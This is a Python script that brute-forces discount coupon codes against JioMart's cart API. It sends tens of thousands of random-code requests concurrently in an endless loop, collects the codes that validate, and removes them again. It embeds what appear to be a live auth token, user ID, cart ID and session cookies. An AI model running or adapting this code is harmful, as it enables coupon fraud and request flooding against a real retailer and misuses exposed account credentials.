import asyncio
import aiohttp
import random
import string

lock = asyncio.Lock()

failed = 0
others = 0
result=""

apply_url = "https://www.jiomart.com/mst/rest/v1/5/cart/apply_coupon"
unapply_url="https://www.jiomart.com/mst/rest/v1/5/cart/unapply_coupon?coupon_code=####&cart_id=648598357"
get_current_coupon_url="https://www.jiomart.com/mst/rest/v1/5/cart/get"
headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "authtoken": "b3720c54d956bdc5f87dc8570166689125c4d178-91131361",
        "pin": "560068",
        "priority": "u=1, i",
        "referer": "https://www.jiomart.com/checkout/cart",
        "sec-ch-ua": '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
        "userid": "81712781"
}
cookies = {
        "_ALGOLIA": "anonymous-d2a88e42-070e-4e6d-8a8d-c6b3d7490e5e",
        "new_customer": "false",
        "ajs_anonymous_id": "2f0b9a55-8526-4e6d-ade1-89891a30ea79",
        "nms_mgo_pincode": "560068",
        "nms_mgo_city": "Bangalore",
        "nms_mgo_state_code": "KA"
}


# 🔹 Generate coupon code
def generate_random_code():
    digits = '123456789'
    letters = string.ascii_uppercase
    result = ''
    for i in range(10):
        if i % 2 == 0:
            result += random.choice(digits)
        else:
            result += random.choice(letters)
    return result


async def calling_rest_generic(session,params,url):
    global failed, others, result

    try:
        async with session.get(url, headers=headers, cookies=cookies, params=params) as resp:
            data = await resp.json()
            print(f"Response for {url}:", data)
            return data
    except Exception as e:
        print("Error:", e)

# 🔹 Async request worker
async def calling_rest(session, code):
    global failed, others, result
    params = {
        "coupon_code": code,
        "cart_id": "648598357"
    }
    
    data=await calling_rest_generic(session, params, apply_url)
    async with lock:
        if data and data['reason'] and data['reason']['reason_code'] != 'MAX_LIMIT_BREACH':
            failed += 1
        else:
            others += 1
            data_valid = await calling_rest_generic(session,params, get_current_coupon_url) 
            valid_code=data_valid['result']['cart']['applied_coupons']
            result += valid_code+","
            await calling_rest_generic(session,params, unapply_url.replace('####',valid_code))
        print(f"failed={failed}, others={others}")
        print("Response:", data)
        print("Result: ",result)


# 🔹 Main async runner
async def main():
    total_requests = 50000   # total API calls
    concurrency = 200      # max in parallel (like thread pool size)

    connector = aiohttp.TCPConnector(limit=concurrency)  # connection limit
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            tasks = [calling_rest(session, generate_random_code()) for _ in range(total_requests)]
            await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
    print(result)
